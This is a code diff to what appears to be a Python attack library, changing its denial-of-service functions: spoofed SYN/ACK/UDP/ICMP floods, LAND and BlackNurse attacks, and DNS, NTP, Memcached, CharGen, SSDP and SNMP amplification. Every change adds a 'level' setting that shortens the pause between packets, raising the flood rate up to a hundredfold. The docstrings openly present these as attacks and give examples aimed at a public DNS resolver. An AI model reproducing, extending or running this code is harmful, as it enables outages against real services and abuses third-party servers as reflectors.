@@ -1804,6 +1804,7 @@ class sflood(threading.Thread):
  def run(self):
   global synflood_counter
   dip=target
+  self.speed=speed
   self.target=target
   self.port=port
   self.synf=synf
@@ -1826,7 +1827,7 @@ class sflood(threading.Thread):
   time.sleep(2)
   while (stop!=True):
    try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     if self.s_port<0:
      sp=random.randint(self.min_por,self.max_por)
@@ -1908,8 +1909,8 @@ class sflood(threading.Thread):
      print("[!]Packets: {} | IP: {} | Type: {} | Bytes: {}".format(synflood_counter,sip,req,leng))
    except Exception as e:
     pass
-   time.sleep(.1)
-def synflood(u,p=80,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window=-1,payload=0,low=64,maxi=64,ampli=15,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def synflood(u,p=80,level=1,source_port=-1,max_port=65535,min_port=1024,ip_range=None,max_window=255,min_window=1,threads=100,syn=1,rst=0,psh=0,ack=0,urg=0,fin=0,window=-1,payload=0,min_ttl=64,max_ttl=64,ampli=1,interval=300,logs=True,returning=False):
   '''
    this function is for TCP flags floods with spoofed randomly IPs. you can launch any type of spoofed TCP floods by modifying the parameters (SYN, SYN-ACK, ACK, ACK-PSH, FIN...) and another wonderful thing here is that you can also send either spoofed legitimte HTTP requests (GET & POST), randomly created TCP data (which you can control their size), or just send no data with the spoofed packets, also you can modify the window size and Time To Live (TTL) values for more random and unique packets!!! now this is something you won't fine anywhere else on github or stackoverflow ;).
 
@@ -1935,6 +1936,17 @@ def synflood(u,p=80,source_port=-1,max_port=65535,min_port=1024,ip_range=None,ma
    >>>bane.synflood('8.8.8.8',syn=0,ack=1)
 
 '''
+  global speed
+  if level<=1:
+   speed=0.1
+  elif level==2:
+   speed=0.05
+  elif level==3:
+   speed=0.01
+  elif level==4:
+   speed=0.005
+  elif level>=5:
+   speed=0.001
   global synflood_counter
   synflood_counter=0
   global stop
@@ -1982,9 +1994,9 @@ def synflood(u,p=80,source_port=-1,max_port=65535,min_port=1024,ip_range=None,ma
   if paylo>2:
    paylo=2
   global maxttl
-  maxttl=maxi
+  maxttl=max_ttl
   global minttl
-  minttl=low
+  minttl=min_ttl
   global amp
   if ampli<1:
    ampli=1
@@ -2018,6 +2030,7 @@ def synflood(u,p=80,source_port=-1,max_port=65535,min_port=1024,ip_range=None,ma
 class udpsp(threading.Thread):
  def run(self):
   global udpstorm_counter
+  self.speed=speed
   self.target=target
   self.port=port
   self.maxttl=maxttl
@@ -2051,13 +2064,24 @@ class udpsp(threading.Thread):
     udpstorm_counter+=1
     if prints==True:
      print("[!]Packets: {} | IP: {} | Type: UDP | Bytes: {}".format(udpstorm_counter,sip,len(packet)))
-    time.sleep(.1)
    except:
     pass
-def udpstorm(u,p=80,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,low=64,maxi=64,ampli=1,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def udpstorm(u,p=80,level=1,ip_range=None,source_port=-1,max_port=65535,min_port=1024,threads=100,min_ttl=64,max_ttl=64,ampli=1,interval=300,logs=True,returning=False):
  '''
    this function is for UDP flood attack using spoofed sources
 '''
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global udpstorm_counter
  udpstorm_counter=0
  global stop
@@ -2083,9 +2107,9 @@ def udpstorm(u,p=80,ip_range=None,source_port=-1,max_port=65535,min_port=1024,th
   ampli=15
  amp=ampli
  global maxttl
- maxttl=maxi
+ maxttl=max_ttl
  global minttl
- minttl=low
+ minttl=min_ttl
  wh=0
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -2112,6 +2136,7 @@ def udpstorm(u,p=80,ip_range=None,source_port=-1,max_port=65535,min_port=1024,th
 class ln(threading.Thread):
  def run(self):
   global land_counter
+  self.speed=speed
   self.target=target
   self.port=port
   self.maxttl=maxttl
@@ -2181,13 +2206,24 @@ class ln(threading.Thread):
     land_counter+=1
     if prints==True:
      print("[!]Packets: {} | Type: {} | Bytes: {}".format(land_counter,req,len(urd)))
-    time.sleep(.1)
    except Exception as e:
     pass
-def land(u,p=80,threads=100,max_window=255,min_window=1,low=64,maxi=64,ampli=15,payload=0,window=-1,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def land(u,p=80,level=1,threads=100,max_window=255,min_window=1,min_ttl=64,max_ttl=64,ampli=1,payload=0,window=-1,interval=300,logs=True,returning=False):
  '''
    this function is for LAND attack in which we are spoofing the victim's IP and targeted port.
 '''
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global land_counter
  land_counter=0
  global stop
@@ -2213,9 +2249,9 @@ def land(u,p=80,threads=100,max_window=255,min_window=1,low=64,maxi=64,ampli=15,
   ampli=15
  amp=ampli
  global maxttl
- maxttl=maxi
+ maxttl=max_ttl
  global minttl
- minttl=low
+ minttl=min_ttl
  global paylo
  paylo=int(payload)
  if paylo<0:
@@ -2250,6 +2286,7 @@ def land(u,p=80,threads=100,max_window=255,min_window=1,low=64,maxi=64,ampli=15,
 class dampli(threading.Thread):
  def run(self):
   global dnsamplif_counter
+  self.speed=speed
   self.target=target
   self.port=port
   self.query=query
@@ -2267,8 +2304,8 @@ class dampli(threading.Thread):
      print ("[!]Packets sent: {} | IP: {}".format(dnsamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(.1)
-def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def dnsamplif(u,p=80,level=1,dnslist=[],threads=100,q='ANY',interval=300,logs=True,returning=False):
  '''
    this function is for DNS amplification attack using and list of DNS servers provided by the user.
 
@@ -2285,6 +2322,17 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,retur
    >>>bane.dnsamplif('8.8.8.8',dnslist=a)
 
 '''
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global dnsamplif_counter
  dnsamplif_counter=0
  global stop
@@ -2331,6 +2379,7 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,retur
 class nampli(threading.Thread):
  def run(self):
   global ntpamplif_counter
+  self.speed=speed
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2347,8 +2396,8 @@ class nampli(threading.Thread):
      print ("[!]Packets sent: {} | IP: {}".format(ntpamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(.1)
-def ntpamplif(u,p=80,ntplist=[],threads=100,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def ntpamplif(u,p=80,level=1,ntplist=[],threads=100,interval=300,logs=True,returning=False):
  '''
    this function is for NTP amplification attack using and list of DNS servers provided by the user.
 
@@ -2365,6 +2414,17 @@ def ntpamplif(u,p=80,ntplist=[],threads=100,interval=300,logs=True,returning=Fal
 
 '''
  global ntpamplif_counter
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  ntpamplif_counter=0
  global stop
  stop=False
@@ -2402,6 +2462,7 @@ def ntpamplif(u,p=80,ntplist=[],threads=100,interval=300,logs=True,returning=Fal
 class memampli(threading.Thread):
  def run(self):
   global memcacheamplif_counter
+  self.speed=speed
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2418,8 +2479,8 @@ class memampli(threading.Thread):
      print ("[!]Packets sent: {} | IP: {}".format(memcacheamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(.1)
-def memcacheamplif(u,p=80,memlist=[],threads=100,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def memcacheamplif(u,p=80,level=1,memlist=[],threads=100,interval=300,logs=True,returning=False):
  '''
    this function is for Memcached amplification attack using and list of DNS servers provided by the user.
 
@@ -2437,6 +2498,17 @@ def memcacheamplif(u,p=80,memlist=[],threads=100,interval=300,logs=True,returnin
 '''
  global memcacheamplif_counter
  memcacheamplif_counter=0
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global stop
  stop=False
  global prints
@@ -2474,6 +2546,7 @@ class charampli(threading.Thread):
  def run(self):
   global chargenamplif_counter
   self.target=target
+  self.speed=speed
   self.port=port
   time.sleep(2)
   while (stop!=True):
@@ -2489,8 +2562,8 @@ class charampli(threading.Thread):
      print ("[!]Packets sent: {} | IP: {}".format(chargenamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(.1)
-def chargenamplif(u,p=80,chargenlist=[],threads=100,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def chargenamplif(u,p=80,level=1,chargenlist=[],threads=100,interval=300,logs=True,returning=False):
  '''
    this function is for CharGen amplification attack using and list of DNS servers provided by the user.
 
@@ -2508,6 +2581,17 @@ def chargenamplif(u,p=80,chargenlist=[],threads=100,interval=300,logs=True,retur
 '''
  global chargenamplif_counter
  chargenamplif_counter=0
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global stop
  stop=False
  global prints
@@ -2544,6 +2628,7 @@ def chargenamplif(u,p=80,chargenlist=[],threads=100,interval=300,logs=True,retur
 class ssampli(threading.Thread):
  def run(self):
   global ssdpamplif_counter
+  self.speed=speed
   self.target=target
   self.port=port
   time.sleep(2)
@@ -2560,8 +2645,8 @@ class ssampli(threading.Thread):
      print ("[!]Packets sent: {} | IP: {}".format(ssdpamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(.1)
-def ssdpamplif(u,p=80,ssdplist=[],threads=100,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def ssdpamplif(u,p=80,level=1,ssdplist=[],threads=100,interval=300,logs=True,returning=False):
  '''
    this function is for CharGen amplification attack using and list of DNS servers provided by the user.
 
@@ -2579,6 +2664,17 @@ def ssdpamplif(u,p=80,ssdplist=[],threads=100,interval=300,logs=True,returning=F
 '''
  global ssdpamplif_counter
  ssdpamplif_counter=0
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global stop
  stop=False
  global prints
@@ -2616,6 +2712,7 @@ class snampli(threading.Thread):
  def run(self):
   global snmpamplif_counter
   self.target=target
+  self.speed=speed
   self.port=port
   time.sleep(2)
   while (stop!=True):
@@ -2631,8 +2728,8 @@ class snampli(threading.Thread):
      print ("[!]Packets sent: {} | IP: {}".format(snmpamplif_counter,ip))
    except Exception as e:
     pass
-   time.sleep(.1)
-def snmpamplif(u,p=80,snmplist=[],threads=100,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def snmpamplif(u,p=80,level=1,snmplist=[],threads=100,interval=300,logs=True,returning=False):
  '''
    this function is for SNMP amplification attack using and list of DNS servers provided by the user.
 
@@ -2650,6 +2747,17 @@ def snmpamplif(u,p=80,snmplist=[],threads=100,interval=300,logs=True,returning=F
 '''
  global snmpamplif_counter
  snmpamplif_counter=0
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global stop
  stop=False
  global prints
@@ -2687,6 +2795,7 @@ class echst(threading.Thread):
  def run(self):
   global echo_ref_counter
   self.target=target
+  self.speed=speed
   self.port=port
   self.amp=amp
   time.sleep(2)
@@ -2708,13 +2817,24 @@ class echst(threading.Thread):
      print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(echo_ref_counter,ip,len(data)))
    except Exception as e:
     pass
-   time.sleep(.1)
-def echo_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,returning=True):
+   time.sleep(self.speed)
+def echo_ref(u,p=80,level=1,pinglist=[],ampli=1,threads=100,interval=300,logs=True,returning=True):
  '''
    this function is for ECHO  reflection attack
 '''
  global echo_ref_counter
  echo_ref_counter=0
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global stop
  stop=False
  global prints
@@ -2757,6 +2877,7 @@ def echo_ref(u,p=80,pinglist=[],ampli=15,threads=100,interval=300,logs=True,retu
 class icmpcl(threading.Thread):
  def run(self):
   global icmp_counter
+  self.speed=speed
   self.target=target
   self.port=port
   self.minttl=minttl
@@ -2780,11 +2901,22 @@ class icmpcl(threading.Thread):
      print("[!]Packets sent: {} | Bytes: {}".format(icmp_counter,len(data)))
    except Exception as e:
     pass
-   time.sleep(.1)
-def icmp(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def icmp(u,p=80,ampli=1,level=1,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=False):
  '''
    this function is for ICMP flood attack
 '''
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global icmp_counter
  icmp_counter=0
  global stop
@@ -2802,9 +2934,9 @@ def icmp(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,retur
   ampli=15
  amp=ampli
  global maxttl
- maxttl=maxi
+ maxttl=max_ttl
  global minttl
- minttl=low
+ minttl=min_ttl
  wh=0
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -2831,6 +2963,7 @@ def icmp(u,p=80,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,retur
 class icmpst(threading.Thread):
  def run(self):
   global icmpstorm_counter
+  self.speed=speed
   self.target=target
   self.port=port
   self.minttl=minttl
@@ -2859,13 +2992,24 @@ class icmpst(threading.Thread):
      print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
    except Exception as e:
     pass
-   time.sleep(.1)
-def icmpstorm(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,interval=300,logs=True,returning=True):
+   time.sleep(self.speed)
+def icmpstorm(u,p=80,level=1,ip_range=None,ampli=1,min_ttl=64,max_ttl=64,threads=100,interval=300,logs=True,returning=True):
  '''
    this function is for ICMP flood with spoofed sources
 '''
  global icmpstorm_counter
  icmpstorm_counter=0
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global stop
  stop=False
  global ip_seg
@@ -2883,9 +3027,9 @@ def icmpstorm(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,interval=
   ampli=15
  amp=ampli
  global maxttl
- maxttl=maxi
+ maxttl=max_ttl
  global minttl
- minttl=low
+ minttl=min_ttl
  wh=0
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -2913,6 +3057,7 @@ class blnu(threading.Thread):
  def run(self):
   global blacknurse_counter
   self.target=target
+  self.speed=speed
   self.port=port
   self.minttl=minttl
   self.maxttl=maxttl
@@ -2934,13 +3079,24 @@ class blnu(threading.Thread):
      print ("[!]Packets sent: {} | IP: {}".format(blacknurse_counter,sip))
    except Exception as e:
     pass
-   time.sleep(.1)
-def blacknurse(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,payloads=False,interval=300,logs=True,returning=False):
+   time.sleep(self.speed)
+def blacknurse(u,p=80,level=1,ip_range=None,min_ttl=64,max_ttl=64,threads=100,payloads=False,interval=300,logs=True,returning=False):
  '''
    this function is for "black nurse" attack
 '''
  global blacknurse_counter
  blacknurse_counter=0
+ global speed
+ if level<=1:
+  speed=0.1
+ elif level==2:
+  speed=0.05
+ elif level==3:
+  speed=0.01
+ elif level==4:
+  speed=0.005
+ elif level>=5:
+  speed=0.001
  global stop
  stop=False
  global ip_seg
@@ -2951,16 +3107,10 @@ def blacknurse(u,p=80,ip_range=None,ampli=15,low=64,maxi=64,threads=100,payloads
  target=u
  global port
  port=p
- global amp
- if ampli<1:
-  ampli=1
- if ampli>15:
-  ampli=15
- amp=ampli
  global maxttl
- maxttl=maxi
+ maxttl=max_ttl
  global minttl
- minttl=low
+ minttl=min_ttl
  global paylo
  paylo=payloads
  wh=0
